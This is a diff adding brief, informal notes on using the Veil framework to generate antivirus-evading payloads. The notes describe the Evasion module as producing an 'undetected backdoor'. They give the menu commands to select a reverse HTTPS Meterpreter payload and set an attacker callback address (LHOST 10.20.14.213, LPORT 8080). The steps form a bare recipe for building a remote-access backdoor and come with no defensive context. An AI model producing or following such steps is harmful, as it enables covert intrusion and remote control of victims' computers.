@@ -1,0 +1,27 @@
+veil
+
+list
+
+1 evasion <- generates the undetected backdoor
+2 Ordnance <- generates the payloads that is used byy evasion
+
+
+use 1
+
+list<- available payloads 
+evil code is wraped in which programming language/ TYPE of payload(code) executed on tarrrget pc/method use to establish the connection
+rev<- reverse https connection 
+
+
+veil
+list
+use 1
+list
+use 15 (rev https meterpreter)
+
+set LHOST 10.20.14.213
+set LPORT 8080
+
+
+
+ 
